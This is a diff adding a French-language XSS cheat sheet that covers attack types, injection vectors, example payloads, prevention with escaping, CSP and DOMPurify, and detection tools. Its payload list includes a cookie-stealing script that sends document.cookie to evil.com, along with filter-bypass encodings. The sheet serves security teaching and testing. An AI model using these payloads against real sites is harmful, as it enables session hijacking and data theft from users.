@@ -1,0 +1,140 @@
+XSS.md
+
+Cheat Sheet - XSS (Cross-Site Scripting)
+
+Ce document présente les attaques XSS, leurs mécanismes, exemples et défenses, à utiliser dans des environnements contrôlés et légaux uniquement.
+
+
+1. Comprendre XSS
+
+XSS permet à un attaquant d’injecter du code malveillant (souvent JavaScript) dans une page web vue par d’autres utilisateurs, en exploitant un manque de validation des entrées.
+
+Aspect : Cible
+Description : Navigateur des utilisateurs
+
+Aspect : Condition
+Description : Entrée non sanitizée ou mal échappée
+
+Aspect : Moyen
+Description : Injection de scripts (HTML, JS, etc.)
+
+Aspect : Impact
+Description : Vol de données, redirection, exécution de code
+
+2. Types d'attaques XSS
+
+Reflected XSS
+
+Exemple : http://site.com?q=<script>alert(1)</script>
+Description : Script renvoyé dans la réponse via un paramètre
+
+Stored XSS
+
+Exemple : <script>alert('Hacked')</script> (dans un commentaire)
+Description : Stocké sur le serveur et exécuté pour tous
+
+DOM-based XSS
+
+Exemple :
+javascript
+document.write(location.search.slice(1))
+Description : Exécuté côté client sans aller au serveur
+
+3. Vecteurs d’injection courants
+
+Vecteur : Balises HTML
+Exemple : <script>alert(1)</script>
+
+Vecteur : Attributs HTML
+Exemple : <img src="x" onerror="alert(1)">
+
+Vecteur : JavaScript
+Exemple : eval(prompt('Code ici'))
+
+Vecteur : CSS
+Exemple : <style>body{background:url(javascript:alert(1))}</style>
+
+4. Exemples de payloads XSS
+
+Payloads simples
+
+Payload : <script>alert('XSS')</script>
+Description : Alerte basique
+
+Payload : <img src=x onerror=alert(1)>
+Description : Exécuté si l’image ne charge pas
+
+Payload : <a href="javascript:alert(1)">Clique</a>
+Description : Exécuté au clic
+
+Payloads avancés
+
+Payload : <script>document.location='http://evil.com?cookie='+document.cookie</script>
+Description : Vol de cookies
+
+Payload : "><script>alert(1)</script>
+Description : Sortie d’un attribut HTML
+
+Payload : %3Cscript%3Ealert(1)%3C/script%3E
+Description : Encodé URL pour contourner les filtres
+
+5. Préventions contre XSS
+
+Mécanismes de base
+
+Méthode : Échappement
+Description : Encoder < en &lt;, " en &quot;
+
+Méthode : Sanitisation
+Description : Supprimer ou filtrer les balises dangereuses
+
+Méthode : CSP
+Description : Content Security Policy pour limiter les scripts
+
+Exemples d’implémentation
+
+Technique : Échappement PHP
+Code/Exemple : echo htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
+
+Technique : CSP dans header
+Code/Exemple : Content-Security-Policy: script-src 'self';
+
+Technique : Filtrage JS
+Code/Exemple : Utiliser DOMPurify ou bibliothèques similaires
+
+Contournements possibles
+
+Faille : Mauvais encodage
+Explication : Oubli d’échapper dans tous les contextes (HTML, JS)
+
+Faille : CSP faible
+Explication : Autorise unsafe-inline ou sources non sécurisées
+
+Faille : Injection DOM
+Explication : Sanitisation serveur inefficace contre DOM XSS
+
+6. Détection de vulnérabilités XSS
+
+Test : Injection manuelle
+Méthode : Tester <script>alert(1)</script> dans les champs
+
+Test : Outils
+Méthode : Burp Suite, XSS Hunter, OWASP ZAP
+
+Test : Symptôme
+Méthode : Exécution de code ou popup inattendue
+
+7. Variantes avancées
+
+XSS + CSRF
+- Injecter un script pour déclencher une attaque CSRF.
+
+Self-XSS
+
+Exemple : console.log('Test'); (via console dev)
+Description : Utilisateur piégé pour exécuter son propre code
+
+Précautions
+- Usage légal uniquement : Tests dans des environnements autorisés.
+- Outils recommandés : Burp Suite, XSSer pour automatisation.
+- Standards : Suivre OWASP XSS Prevention Cheat Sheet.
